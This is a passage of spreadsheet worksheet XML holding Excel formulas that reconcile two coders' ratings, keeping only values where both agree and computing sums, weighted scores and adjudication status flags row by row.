        <f>IF(AND(Coder1!V4&amp;""&lt;&gt;"",Coder1!V4&amp;""=Coder2!V4&amp;""),Coder1!V4,"")</f>
        <v/>
      </c>
      <c r="W4" s="14">
        <f>IF(AND(Coder1!W4&amp;""&lt;&gt;"",Coder1!W4&amp;""=Coder2!W4&amp;""),Coder1!W4,"")</f>
        <v/>
      </c>
      <c r="X4" s="14">
        <f>IF(AND(Coder1!X4&amp;""&lt;&gt;"",Coder1!X4&amp;""=Coder2!X4&amp;""),Coder1!X4,"")</f>
        <v/>
      </c>
      <c r="Y4" s="14">
        <f>IF(AND(Coder1!Y4&amp;""&lt;&gt;"",Coder1!Y4&amp;""=Coder2!Y4&amp;""),Coder1!Y4,"")</f>
        <v/>
      </c>
      <c r="Z4" s="14">
        <f>IF(AND(Coder1!Z4&amp;""&lt;&gt;"",Coder1!Z4&amp;""=Coder2!Z4&amp;""),Coder1!Z4,"")</f>
        <v/>
      </c>
      <c r="AA4" s="14">
        <f>IF(AND(Coder1!AA4&amp;""&lt;&gt;"",Coder1!AA4&amp;""=Coder2!AA4&amp;""),Coder1!AA4,"")</f>
        <v/>
      </c>
      <c r="AB4" s="14">
        <f>IF(AND(Coder1!AB4&amp;""&lt;&gt;"",Coder1!AB4&amp;""=Coder2!AB4&amp;""),Coder1!AB4,"")</f>
        <v/>
      </c>
      <c r="AC4" s="14">
        <f>IF(AND(Coder1!AC4&amp;""&lt;&gt;"",Coder1!AC4&amp;""=Coder2!AC4&amp;""),Coder1!AC4,"")</f>
        <v/>
      </c>
      <c r="AD4" s="14">
        <f>IF(AND(Coder1!AD4&amp;""&lt;&gt;"",Coder1!AD4&amp;""=Coder2!AD4&amp;""),Coder1!AD4,"")</f>
        <v/>
      </c>
      <c r="AE4" s="14">
        <f>IF(AND(Coder1!AE4&amp;""&lt;&gt;"",Coder1!AE4&amp;""=Coder2!AE4&amp;""),Coder1!AE4,"")</f>
        <v/>
      </c>
      <c r="AF4" s="14">
        <f>IF(AND(Coder1!AF4&amp;""&lt;&gt;"",Coder1!AF4&amp;""=Coder2!AF4&amp;""),Coder1!AF4,"")</f>
        <v/>
      </c>
      <c r="AG4" s="14">
        <f>IF(AND(Coder1!AG4&amp;""&lt;&gt;"",Coder1!AG4&amp;""=Coder2!AG4&amp;""),Coder1!AG4,"")</f>
        <v/>
      </c>
      <c r="AH4" s="14">
        <f>IF(AND(Coder1!AH4&amp;""&lt;&gt;"",Coder1!AH4&amp;""=Coder2!AH4&amp;""),Coder1!AH4,"")</f>
        <v/>
      </c>
      <c r="AI4" s="11">
        <f>IF(COUNT(E4:L4)=0,"",SUM(E4:L4))</f>
        <v/>
      </c>
      <c r="AJ4" s="11">
        <f>IF(AI4="","",N(E4)*3+N(F4)*2+N(G4)*2+N(H4)*2+N(I4)*2+N(J4)*3+N(K4)*3+N(L4)*3)</f>
        <v/>
      </c>
      <c r="AK4" s="11">
        <f>IF(AI4="","",COUNTIF(N4:AG4,1))</f>
        <v/>
      </c>
      <c r="AL4" s="11">
        <f>IF(OR(AJ4="",AJ4=0),"",ROUND(100*(AJ4-AK4)/AJ4,1))</f>
        <v/>
      </c>
      <c r="AM4" s="11">
        <f>IF(AND(Coder1!AN4=1,Coder2!AN4=1),IF(COUNTBLANK(E4:AH4)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN4" s="11">
        <f>IF(AND(Coder1!AN4=1,Coder2!AN4=1),IF(SUMPRODUCT(--(Coder1!E4:AH4&amp;""&lt;&gt;Coder2!E4:AH4&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO4" s="11" t="n"/>
    </row>
    <row r="5">
      <c r="A5" s="11">
        <f>Coder1!A5</f>
        <v/>
      </c>
      <c r="B5" s="11">
        <f>Coder1!B5</f>
        <v/>
      </c>
      <c r="C5" s="11">
        <f>Coder1!C5</f>
        <v/>
      </c>
      <c r="D5" s="11">
        <f>Coder1!D5</f>
        <v/>
      </c>
      <c r="E5" s="14">
        <f>IF(AND(Coder1!E5&amp;""&lt;&gt;"",Coder1!E5&amp;""=Coder2!E5&amp;""),Coder1!E5,"")</f>
        <v/>
      </c>
      <c r="F5" s="14">
        <f>IF(AND(Coder1!F5&amp;""&lt;&gt;"",Coder1!F5&amp;""=Coder2!F5&amp;""),Coder1!F5,"")</f>
        <v/>
      </c>
      <c r="G5" s="14">
        <f>IF(AND(Coder1!G5&amp;""&lt;&gt;"",Coder1!G5&amp;""=Coder2!G5&amp;""),Coder1!G5,"")</f>
        <v/>
      </c>
      <c r="H5" s="14">
        <f>IF(AND(Coder1!H5&amp;""&lt;&gt;"",Coder1!H5&amp;""=Coder2!H5&amp;""),Coder1!H5,"")</f>
        <v/>
      </c>
      <c r="I5" s="14">
        <f>IF(AND(Coder1!I5&amp;""&lt;&gt;"",Coder1!I5&amp;""=Coder2!I5&amp;""),Coder1!I5,"")</f>
        <v/>
      </c>
      <c r="J5" s="14">
        <f>IF(AND(Coder1!J5&amp;""&lt;&gt;"",Coder1!J5&amp;""=Coder2!J5&amp;""),Coder1!J5,"")</f>
        <v/>
      </c>
      <c r="K5" s="14">
        <f>IF(AND(Coder1!K5&amp;""&lt;&gt;"",Coder1!K5&amp;""=Coder2!K5&amp;""),Coder1!K5,"")</f>
        <v/>
      </c>
      <c r="L5" s="14">
        <f>IF(AND(Coder1!L5&amp;""&lt;&gt;"",Coder1!L5&amp;""=Coder2!L5&amp;""),Coder1!L5,"")</f>
        <v/>
      </c>
      <c r="M5" s="14">
        <f>IF(AND(Coder1!M5&amp;""&lt;&gt;"",Coder1!M5&amp;""=Coder2!M5&amp;""),Coder1!M5,"")</f>
        <v/>
      </c>
      <c r="N5" s="14">
        <f>IF(AND(Coder1!N5&amp;""&lt;&gt;"",Coder1!N5&amp;""=Coder2!N5&amp;""),Coder1!N5,"")</f>
        <v/>
      </c>
      <c r="O5" s="14">
        <f>IF(AND(Coder1!O5&amp;""&lt;&gt;"",Coder1!O5&amp;""=Coder2!O5&amp;""),Coder1!O5,"")</f>
        <v/>
      </c>
      <c r="P5" s="14">
        <f>IF(AND(Coder1!P5&amp;""&lt;&gt;"",Coder1!P5&amp;""=Coder2!P5&amp;""),Coder1!P5,"")</f>
        <v/>
      </c>
      <c r="Q5" s="14">
        <f>IF(AND(Coder1!Q5&amp;""&lt;&gt;"",Coder1!Q5&amp;""=Coder2!Q5&amp;""),Coder1!Q5,"")</f>
        <v/>
      </c>
      <c r="R5" s="14">
        <f>IF(AND(Coder1!R5&amp;""&lt;&gt;"",Coder1!R5&amp;""=Coder2!R5&amp;""),Coder1!R5,"")</f>
        <v/>
      </c>
      <c r="S5" s="14">
        <f>IF(AND(Coder1!S5&amp;""&lt;&gt;"",Coder1!S5&amp;""=Coder2!S5&amp;""),Coder1!S5,"")</f>
        <v/>
      </c>
      <c r="T5" s="14">
        <f>IF(AND(Coder1!T5&amp;""&lt;&gt;"",Coder1!T5&amp;""=Coder2!T5&amp;""),Coder1!T5,"")</f>
        <v/>
      </c>
      <c r="U5" s="14">
        <f>IF(AND(Coder1!U5&amp;""&lt;&gt;"",Coder1!U5&amp;""=Coder2!U5&amp;""),Coder1!U5,"")</f>
        <v/>
      </c>
      <c r="V5" s="14">
        <f>IF(AND(Coder1!V5&amp;""&lt;&gt;"",Coder1!V5&amp;""=Coder2!V5&amp;""),Coder1!V5,"")</f>
        <v/>
      </c>
      <c r="W5" s="14">
        <f>IF(AND(Coder1!W5&amp;""&lt;&gt;"",Coder1!W5&amp;""=Coder2!W5&amp;""),Coder1!W5,"")</f>
        <v/>
      </c>
      <c r="X5" s="14">
        <f>IF(AND(Coder1!X5&amp;""&lt;&gt;"",Coder1!X5&amp;""=Coder2!X5&amp;""),Coder1!X5,"")</f>
        <v/>
      </c>
      <c r="Y5" s="14">
        <f>IF(AND(Coder1!Y5&amp;""&lt;&gt;"",Coder1!Y5&amp;""=Coder2!Y5&amp;""),Coder1!Y5,"")</f>
        <v/>
      </c>
      <c r="Z5" s="14">
        <f>IF(AND(Coder1!Z5&amp;""&lt;&gt;"",Coder1!Z5&amp;""=Coder2!Z5&amp;""),Coder1!Z5,"")</f>
        <v/>
      </c>
      <c r="AA5" s="14">
        <f>IF(AND(Coder1!AA5&amp;""&lt;&gt;"",Coder1!AA5&amp;""=Coder2!AA5&amp;""),Coder1!AA5,"")</f>
        <v/>
      </c>
      <c r="AB5" s="14">
        <f>IF(AND(Coder1!AB5&amp;""&lt;&gt;"",Coder1!AB5&amp;""=Coder2!AB5&amp;""),Coder1!AB5,"")</f>
        <v/>
      </c>
      <c r="AC5" s="14">
        <f>IF(AND(Coder1!AC5&amp;""&lt;&gt;"",Coder1!AC5&amp;""=Coder2!AC5&amp;""),Coder1!AC5,"")</f>
        <v/>
      </c>
      <c r="AD5" s="14">
        <f>IF(AND(Coder1!AD5&amp;""&lt;&gt;"",Coder1!AD5&amp;""=Coder2!AD5&amp;""),Coder1!AD5,"")</f>
        <v/>
      </c>
      <c r="AE5" s="14">
        <f>IF(AND(Coder1!AE5&amp;""&lt;&gt;"",Coder1!AE5&amp;""=Coder2!AE5&amp;""),Coder1!AE5,"")</f>
        <v/>
      </c>
      <c r="AF5" s="14">
        <f>IF(AND(Coder1!AF5&amp;""&lt;&gt;"",Coder1!AF5&amp;""=Coder2!AF5&amp;""),Coder1!AF5,"")</f>
        <v/>
      </c>
      <c r="AG5" s="14">
        <f>IF(AND(Coder1!AG5&amp;""&lt;&gt;"",Coder1!AG5&amp;""=Coder2!AG5&amp;""),Coder1!AG5,"")</f>
        <v/>
      </c>
      <c r="AH5" s="14">
        <f>IF(AND(Coder1!AH5&amp;""&lt;&gt;"",Coder1!AH5&amp;""=Coder2!AH5&amp;""),Coder1!AH5,"")</f>
        <v/>
      </c>
      <c r="AI5" s="11">
        <f>IF(COUNT(E5:L5)=0,"",SUM(E5:L5))</f>
        <v/>
      </c>
      <c r="AJ5" s="11">
        <f>IF(AI5="","",N(E5)*3+N(F5)*2+N(G5)*2+N(H5)*2+N(I5)*2+N(J5)*3+N(K5)*3+N(L5)*3)</f>
        <v/>
      </c>
      <c r="AK5" s="11">
        <f>IF(AI5="","",COUNTIF(N5:AG5,1))</f>
        <v/>
      </c>
      <c r="AL5" s="11">
        <f>IF(OR(AJ5="",AJ5=0),"",ROUND(100*(AJ5-AK5)/AJ5,1))</f>
        <v/>
      </c>
      <c r="AM5" s="11">
        <f>IF(AND(Coder1!AN5=1,Coder2!AN5=1),IF(COUNTBLANK(E5:AH5)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN5" s="11">
        <f>IF(AND(Coder1!AN5=1,Coder2!AN5=1),IF(SUMPRODUCT(--(Coder1!E5:AH5&amp;""&lt;&gt;Coder2!E5:AH5&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO5" s="11" t="n"/>
    </row>
    <row r="6">
      <c r="A6" s="11">
        <f>Coder1!A6</f>
        <v/>
      </c>
      <c r="B6" s="11">
        <f>Coder1!B6</f>
        <v/>
      </c>
      <c r="C6" s="11">
        <f>Coder1!C6</f>
        <v/>
      </c>
      <c r="D6" s="11">
        <f>Coder1!D6</f>
        <v/>
      </c>
      <c r="E6" s="14">
        <f>IF(AND(Coder1!E6&amp;""&lt;&gt;"",Coder1!E6&amp;""=Coder2!E6&amp;""),Coder1!E6,"")</f>
        <v/>
      </c>
      <c r="F6" s="14">
        <f>IF(AND(Coder1!F6&amp;""&lt;&gt;"",Coder1!F6&amp;""=Coder2!F6&amp;""),Coder1!F6,"")</f>
        <v/>
      </c>
      <c r="G6" s="14">
        <f>IF(AND(Coder1!G6&amp;""&lt;&gt;"",Coder1!G6&amp;""=Coder2!G6&amp;""),Coder1!G6,"")</f>
        <v/>
      </c>
      <c r="H6" s="14">
        <f>IF(AND(Coder1!H6&amp;""&lt;&gt;"",Coder1!H6&amp;""=Coder2!H6&amp;""),Coder1!H6,"")</f>
        <v/>
      </c>
      <c r="I6" s="14">
        <f>IF(AND(Coder1!I6&amp;""&lt;&gt;"",Coder1!I6&amp;""=Coder2!I6&amp;""),Coder1!I6,"")</f>
        <v/>
      </c>
      <c r="J6" s="14">
        <f>IF(AND(Coder1!J6&amp;""&lt;&gt;"",Coder1!J6&amp;""=Coder2!J6&amp;""),Coder1!J6,"")</f>
        <v/>
      </c>
      <c r="K6" s="14">
        <f>IF(AND(Coder1!K6&amp;""&lt;&gt;"",Coder1!K6&amp;""=Coder2!K6&amp;""),Coder1!K6,"")</f>
        <v/>
      </c>
      <c r="L6" s="14">
        <f>IF(AND(Coder1!L6&amp;""&lt;&gt;"",Coder1!L6&amp;""=Coder2!L6&amp;""),Coder1!L6,"")</f>
        <v/>
      </c>
      <c r="M6" s="14">
        <f>IF(AND(Coder1!M6&amp;""&lt;&gt;"",Coder1!M6&amp;""=Coder2!M6&amp;""),Coder1!M6,"")</f>
        <v/>
      </c>
      <c r="N6" s="14">
        <f>IF(AND(Coder1!N6&amp;""&lt;&gt;"",Coder1!N6&amp;""=Coder2!N6&amp;""),Coder1!N6,"")</f>
        <v/>
      </c>
      <c r="O6" s="14">
        <f>IF(AND(Coder1!O6&amp;""&lt;&gt;"",Coder1!O6&amp;""=Coder2!O6&amp;""),Coder1!O6,"")</f>
        <v/>
      </c>
      <c r="P6" s="14">
        <f>IF(AND(Coder1!P6&amp;""&lt;&gt;"",Coder1!P6&amp;""=Coder2!P6&amp;""),Coder1!P6,"")</f>
        <v/>
      </c>
      <c r="Q6" s="14">
        <f>IF(AND(Coder1!Q6&amp;""&lt;&gt;"",Coder1!Q6&amp;""=Coder2!Q6&amp;""),Coder1!Q6,"")</f>
        <v/>
      </c>
      <c r="R6" s="14">
        <f>IF(AND(Coder1!R6&amp;""&lt;&gt;"",Coder1!R6&amp;""=Coder2!R6&amp;""),Coder1!R6,"")</f>
        <v/>
      </c>
      <c r="S6" s="14">
        <f>IF(AND(Coder1!S6&amp;""&lt;&gt;"",Coder1!S6&amp;""=Coder2!S6&amp;""),Coder1!S6,"")</f>
        <v/>
      </c>
      <c r="T6" s="14">
        <f>IF(AND(Coder1!T6&amp;""&lt;&gt;"",Coder1!T6&amp;""=Coder2!T6&amp;""),Coder1!T6,"")</f>
        <v/>
      </c>
      <c r="U6" s="14">
        <f>IF(AND(Coder1!U6&amp;""&lt;&gt;"",Coder1!U6&amp;""=Coder2!U6&amp;""),Coder1!U6,"")</f>
        <v/>
      </c>
      <c r="V6" s="14">
        <f>IF(AND(Coder1!V6&amp;""&lt;&gt;"",Coder1!V6&amp;""=Coder2!V6&amp;""),Coder1!V6,"")</f>
        <v/>
      </c>
      <c r="W6" s="14">
        <f>IF(AND(Coder1!W6&amp;""&lt;&gt;"",Coder1!W6&amp;""=Coder2!W6&amp;""),Coder1!W6,"")</f>
        <v/>
      </c>
      <c r="X6" s="14">
        <f>IF(AND(Coder1!X6&amp;""&lt;&gt;"",Coder1!X6&amp;""=Coder2!X6&amp;""),Coder1!X6,"")</f>
        <v/>
      </c>
      <c r="Y6" s="14">
        <f>IF(AND(Coder1!Y6&amp;""&lt;&gt;"",Coder1!Y6&amp;""=Coder2!Y6&amp;""),Coder1!Y6,"")</f>
        <v/>
      </c>
      <c r="Z6" s="14">
        <f>IF(AND(Coder1!Z6&amp;""&lt;&gt;"",Coder1!Z6&amp;""=Coder2!Z6&amp;""),Coder1!Z6,"")</f>
        <v/>
      </c>
      <c r="AA6" s="14">
        <f>IF(AND(Coder1!AA6&amp;""&lt;&gt;"",Coder1!AA6&amp;""=Coder2!AA6&amp;""),Coder1!AA6,"")</f>
        <v/>
      </c>
      <c r="AB6" s="14">
        <f>IF(AND(Coder1!AB6&amp;""&lt;&gt;"",Coder1!AB6&amp;""=Coder2!AB6&amp;""),Coder1!AB6,"")</f>
        <v/>
      </c>
      <c r="AC6" s="14">
        <f>IF(AND(Coder1!AC6&amp;""&lt;&gt;"",Coder1!AC6&amp;""=Coder2!AC6&amp;""),Coder1!AC6,"")</f>
        <v/>
      </c>
      <c r="AD6" s="14">
        <f>IF(AND(Coder1!AD6&amp;""&lt;&gt;"",Coder1!AD6&amp;""=Coder2!AD6&amp;""),Coder1!AD6,"")</f>
        <v/>
      </c>
      <c r="AE6" s="14">
        <f>IF(AND(Coder1!AE6&amp;""&lt;&gt;"",Coder1!AE6&amp;""=Coder2!AE6&amp;""),Coder1!AE6,"")</f>
        <v/>
      </c>
      <c r="AF6" s="14">
        <f>IF(AND(Coder1!AF6&amp;""&lt;&gt;"",Coder1!AF6&amp;""=Coder2!AF6&amp;""),Coder1!AF6,"")</f>
        <v/>
      </c>
      <c r="AG6" s="14">
        <f>IF(AND(Coder1!AG6&amp;""&lt;&gt;"",Coder1!AG6&amp;""=Coder2!AG6&amp;""),Coder1!AG6,"")</f>
        <v/>
      </c>
      <c r="AH6" s="14">
        <f>IF(AND(Coder1!AH6&amp;""&lt;&gt;"",Coder1!AH6&amp;""=Coder2!AH6&amp;""),Coder1!AH6,"")</f>
        <v/>
      </c>
      <c r="AI6" s="11">
        <f>IF(COUNT(E6:L6)=0,"",SUM(E6:L6))</f>
        <v/>
      </c>
      <c r="AJ6" s="11">
        <f>IF(AI6="","",N(E6)*3+N(F6)*2+N(G6)*2+N(H6)*2+N(I6)*2+N(J6)*3+N(K6)*3+N(L6)*3)</f>
        <v/>
      </c>
      <c r="AK6" s="11">
        <f>IF(AI6="","",COUNTIF(N6:AG6,1))</f>
        <v/>
      </c>
      <c r="AL6" s="11">
        <f>IF(OR(AJ6="",AJ6=0),"",ROUND(100*(AJ6-AK6)/AJ6,1))</f>
        <v/>
      </c>
      <c r="AM6" s="11">
        <f>IF(AND(Coder1!AN6=1,Coder2!AN6=1),IF(COUNTBLANK(E6:AH6)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN6" s="11">
        <f>IF(AND(Coder1!AN6=1,Coder2!AN6=1),IF(SUMPRODUCT(--(Coder1!E6:AH6&amp;""&lt;&gt;Coder2!E6:AH6&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO6" s="11" t="n"/>
    </row>
    <row r="7">
      <c r="A7" s="11">
        <f>Coder1!A7</f>
        <v/>
      </c>
      <c r="B7" s="11">
        <f>Coder1!B7</f>
        <v/>
      </c>
      <c r="C7" s="11">
        <f>Coder1!C7</f>
        <v/>
      </c>
      <c r="D7" s="11">
        <f>Coder1!D7</f>
        <v/>
      </c>
      <c r="E7" s="14">
        <f>IF(AND(Coder1!E7&amp;""&lt;&gt;"",Coder1!E7&amp;""=Coder2!E7&amp;""),Coder1!E7,"")</f>
        <v/>
      </c>
      <c r="F7" s="14">
        <f>IF(AND(Coder1!F7&amp;""&lt;&gt;"",Coder1!F7&amp;""=Coder2!F7&amp;""),Coder1!F7,"")</f>
        <v/>
      </c>
      <c r="G7" s="14">
        <f>IF(AND(Coder1!G7&amp;""&lt;&gt;"",Coder1!G7&amp;""=Coder2!G7&amp;""),Coder1!G7,"")</f>
        <v/>
      </c>
      <c r="H7" s="14">
        <f>IF(AND(Coder1!H7&amp;""&lt;&gt;"",Coder1!H7&amp;""=Coder2!H7&amp;""),Coder1!H7,"")</f>
        <v/>
      </c>
      <c r="I7" s="14">
        <f>IF(AND(Coder1!I7&amp;""&lt;&gt;"",Coder1!I7&amp;""=Coder2!I7&amp;""),Coder1!I7,"")</f>
        <v/>
      </c>
      <c r="J7" s="14">
        <f>IF(AND(Coder1!J7&amp;""&lt;&gt;"",Coder1!J7&amp;""=Coder2!J7&amp;""),Coder1!J7,"")</f>
        <v/>
      </c>
      <c r="K7" s="14">
        <f>IF(AND(Coder1!K7&amp;""&lt;&gt;"",Coder1!K7&amp;""=Coder2!K7&amp;""),Coder1!K7,"")</f>
        <v/>
      </c>
      <c r="L7" s="14">
        <f>IF(AND(Coder1!L7&amp;""&lt;&gt;"",Coder1!L7&amp;""=Coder2!L7&amp;""),Coder1!L7,"")</f>
        <v/>
      </c>
      <c r="M7" s="14">
        <f>IF(AND(Coder1!M7&amp;""&lt;&gt;"",Coder1!M7&amp;""=Coder2!M7&amp;""),Coder1!M7,"")</f>
        <v/>
      </c>
      <c r="N7" s="14">
        <f>IF(AND(Coder1!N7&amp;""&lt;&gt;"",Coder1!N7&amp;""=Coder2!N7&amp;""),Coder1!N7,"")</f>
        <v/>
      </c>
      <c r="O7" s="14">
        <f>IF(AND(Coder1!O7&amp;""&lt;&gt;"",Coder1!O7&amp;""=Coder2!O7&amp;""),Coder1!O7,"")</f>
        <v/>
      </c>
      <c r="P7" s="14">
        <f>IF(AND(Coder1!P7&amp;""&lt;&gt;"",Coder1!P7&amp;""=Coder2!P7&amp;""),Coder1!P7,"")</f>
        <v/>
      </c>
      <c r="Q7" s="14">
        <f>IF(AND(Coder1!Q7&amp;""&lt;&gt;"",Coder1!Q7&amp;""=Coder2!Q7&amp;""),Coder1!Q7,"")</f>
        <v/>
      </c>
      <c r="R7" s="14">
        <f>IF(AND(Coder1!R7&amp;""&lt;&gt;"",Coder1!R7&amp;""=Coder2!R7&amp;""),Coder1!R7,"")</f>
        <v/>
      </c>
      <c r="S7" s="14">
        <f>IF(AND(Coder1!S7&amp;""&lt;&gt;"",Coder1!S7&amp;""=Coder2!S7&amp;""),Coder1!S7,"")</f>
        <v/>
      </c>
      <c r="T7" s="14">
        <f>IF(AND(Coder1!T7&amp;""&lt;&gt;"",Coder1!T7&amp;""=Coder2!T7&amp;""),Coder1!T7,"")</f>
        <v/>
      </c>
      <c r="U7" s="14">
        <f>IF(AND(Coder1!U7&amp;""&lt;&gt;"",Coder1!U7&amp;""=Coder2!U7&amp;""),Coder1!U7,"")</f>
        <v/>
      </c>
      <c r="V7" s="14">
        <f>IF(AND(Coder1!V7&amp;""&lt;&gt;"",Coder1!V7&amp;""=Coder2!V7&amp;""),Coder1!V7,"")</f>
        <v/>
      </c>
      <c r="W7" s="14">
        <f>IF(AND(Coder1!W7&amp;""&lt;&gt;"",Coder1!W7&amp;""=Coder2!W7&amp;""),Coder1!W7,"")</f>
        <v/>
      </c>
      <c r="X7" s="14">
        <f>IF(AND(Coder1!X7&amp;""&lt;&gt;"",Coder1!X7&amp;""=Coder2!X7&amp;""),Coder1!X7,"")</f>
        <v/>
      </c>
      <c r="Y7" s="14">
        <f>IF(AND(Coder1!Y7&amp;""&lt;&gt;"",Coder1!Y7&amp;""=Coder2!Y7&amp;""),Coder1!Y7,"")</f>
        <v/>
      </c>
      <c r="Z7" s="14">
        <f>IF(AND(Coder1!Z7&amp;""&lt;&gt;"",Coder1!Z7&amp;""=Coder2!Z7&amp;""),Coder1!Z7,"")</f>
        <v/>
      </c>
      <c r="AA7" s="14">
        <f>IF(AND(Coder1!AA7&amp;""&lt;&gt;"",Coder1!AA7&amp;""=Coder2!AA7&amp;""),Coder1!AA7,"")</f>
        <v/>
      </c>
      <c r="AB7" s="14">
        <f>IF(AND(Coder1!AB7&amp;""&lt;&gt;"",Coder1!AB7&amp;""=Coder2!AB7&amp;""),Coder1!AB7,"")</f>
        <v/>
      </c>
      <c r="AC7" s="14">
        <f>IF(AND(Coder1!AC7&amp;""&lt;&gt;"",Coder1!AC7&amp;""=Coder2!AC7&amp;""),Coder1!AC7,"")</f>
        <v/>
      </c>
      <c r="AD7" s="14">
        <f>IF(AND(Coder1!AD7&amp;""&lt;&gt;"",Coder1!AD7&amp;""=Coder2!AD7&amp;""),Coder1!AD7,"")</f>
        <v/>
      </c>
      <c r="AE7" s="14">
        <f>IF(AND(Coder1!AE7&amp;""&lt;&gt;"",Coder1!AE7&amp;""=Coder2!AE7&amp;""),Coder1!AE7,"")</f>
        <v/>
      </c>
      <c r="AF7" s="14">
        <f>IF(AND(Coder1!AF7&amp;""&lt;&gt;"",Coder1!AF7&amp;""=Coder2!AF7&amp;""),Coder1!AF7,"")</f>
        <v/>
      </c>
      <c r="AG7" s="14">
        <f>IF(AND(Coder1!AG7&amp;""&lt;&gt;"",Coder1!AG7&amp;""=Coder2!AG7&amp;""),Coder1!AG7,"")</f>
        <v/>
      </c>
      <c r="AH7" s="14">
        <f>IF(AND(Coder1!AH7&amp;""&lt;&gt;"",Coder1!AH7&amp;""=Coder2!AH7&amp;""),Coder1!AH7,"")</f>
        <v/>
      </c>
      <c r="AI7" s="11">
        <f>IF(COUNT(E7:L7)=0,"",SUM(E7:L7))</f>
        <v/>
      </c>
      <c r="AJ7" s="11">
        <f>IF(AI7="","",N(E7)*3+N(F7)*2+N(G7)*2+N(H7)*2+N(I7)*2+N(J7)*3+N(K7)*3+N(L7)*3)</f>
        <v/>
      </c>
      <c r="AK7" s="11">
        <f>IF(AI7="","",COUNTIF(N7:AG7,1))</f>
        <v/>
      </c>
      <c r="AL7" s="11">
        <f>IF(OR(AJ7="",AJ7=0),"",ROUND(100*(AJ7-AK7)/AJ7,1))</f>
        <v/>
      </c>
      <c r="AM7" s="11">
        <f>IF(AND(Coder1!AN7=1,Coder2!AN7=1),IF(COUNTBLANK(E7:AH7)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN7" s="11">
        <f>IF(AND(Coder1!AN7=1,Coder2!AN7=1),IF(SUMPRODUCT(--(Coder1!E7:AH7&amp;""&lt;&gt;Coder2!E7:AH7&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO7" s="11" t="n"/>
    </row>
    <row r="8">
      <c r="A8" s="11">
        <f>Coder1!A8</f>
        <v/>
      </c>
      <c r="B8" s="11">
        <f>Coder1!B8</f>
        <v/>
      </c>
      <c r="C8" s="11">
        <f>Coder1!C8</f>
        <v/>
      </c>
      <c r="D8" s="11">
        <f>Coder1!D8</f>
        <v/>
      </c>
      <c r="E8" s="14">
        <f>IF(AND(Coder1!E8&amp;""&lt;&gt;"",Coder1!E8&amp;""=Coder2!E8&amp;""),Coder1!E8,"")</f>
        <v/>
      </c>
      <c r="F8" s="14">
        <f>IF(AND(Coder1!F8&amp;""&lt;&gt;"",Coder1!F8&amp;""=Coder2!F8&amp;""),Coder1!F8,"")</f>
        <v/>
      </c>
      <c r="G8" s="14">
        <f>IF(AND(Coder1!G8&amp;""&lt;&gt;"",Coder1!G8&amp;""=Coder2!G8&amp;""),Coder1!G8,"")</f>
        <v/>
      </c>
      <c r="H8" s="14">
        <f>IF(AND(Coder1!H8&amp;""&lt;&gt;"",Coder1!H8&amp;""=Coder2!H8&amp;""),Coder1!H8,"")</f>
        <v/>
      </c>
      <c r="I8" s="14">
        <f>IF(AND(Coder1!I8&amp;""&lt;&gt;"",Coder1!I8&amp;""=Coder2!I8&amp;""),Coder1!I8,"")</f>
        <v/>
      </c>
      <c r="J8" s="14">
        <f>IF(AND(Coder1!J8&amp;""&lt;&gt;"",Coder1!J8&amp;""=Coder2!J8&amp;""),Coder1!J8,"")</f>
        <v/>
      </c>
      <c r="K8" s="14">
        <f>IF(AND(Coder1!K8&amp;""&lt;&gt;"",Coder1!K8&amp;""=Coder2!K8&amp;""),Coder1!K8,"")</f>
        <v/>
      </c>
      <c r="L8" s="14">
        <f>IF(AND(Coder1!L8&amp;""&lt;&gt;"",Coder1!L8&amp;""=Coder2!L8&amp;""),Coder1!L8,"")</f>
        <v/>
      </c>
      <c r="M8" s="14">
        <f>IF(AND(Coder1!M8&amp;""&lt;&gt;"",Coder1!M8&amp;""=Coder2!M8&amp;""),Coder1!M8,"")</f>
        <v/>
      </c>
      <c r="N8" s="14">
        <f>IF(AND(Coder1!N8&amp;""&lt;&gt;"",Coder1!N8&amp;""=Coder2!N8&amp;""),Coder1!N8,"")</f>
        <v/>
      </c>
      <c r="O8" s="14">
        <f>IF(AND(Coder1!O8&amp;""&lt;&gt;"",Coder1!O8&amp;""=Coder2!O8&amp;""),Coder1!O8,"")</f>
        <v/>
      </c>
      <c r="P8" s="14">
        <f>IF(AND(Coder1!P8&amp;""&lt;&gt;"",Coder1!P8&amp;""=Coder2!P8&amp;""),Coder1!P8,"")</f>
        <v/>
      </c>
      <c r="Q8" s="14">
        <f>IF(AND(Coder1!Q8&amp;""&lt;&gt;"",Coder1!Q8&amp;""=Coder2!Q8&amp;""),Coder1!Q8,"")</f>
        <v/>
      </c>
      <c r="R8" s="14">
        <f>IF(AND(Coder1!R8&amp;""&lt;&gt;"",Coder1!R8&amp;""=Coder2!R8&amp;""),Coder1!R8,"")</f>
        <v/>
      </c>
      <c r="S8" s="14">
        <f>IF(AND(Coder1!S8&amp;""&lt;&gt;"",Coder1!S8&amp;""=Coder2!S8&amp;""),Coder1!S8,"")</f>
        <v/>
      </c>
      <c r="T8" s="14">
        <f>IF(AND(Coder1!T8&amp;""&lt;&gt;"",Coder1!T8&amp;""=Coder2!T8&amp;""),Coder1!T8,"")</f>
        <v/>
      </c>
      <c r="U8" s="14">
        <f>IF(AND(Coder1!U8&amp;""&lt;&gt;"",Coder1!U8&amp;""=Coder2!U8&amp;""),Coder1!U8,"")</f>
        <v/>
      </c>
      <c r="V8" s="14">
        <f>IF(AND(Coder1!V8&amp;""&lt;&gt;"",Coder1!V8&amp;""=Coder2!V8&amp;""),Coder1!V8,"")</f>
        <v/>
      </c>
      <c r="W8" s="14">
        <f>IF(AND(Coder1!W8&amp;""&lt;&gt;"",Coder1!W8&amp;""=Coder2!W8&amp;""),Coder1!W8,"")</f>
        <v/>
      </c>
      <c r="X8" s="14">
        <f>IF(AND(Coder1!X8&amp;""&lt;&gt;"",Coder1!X8&amp;""=Coder2!X8&amp;""),Coder1!X8,"")</f>
        <v/>
      </c>
      <c r="Y8" s="14">
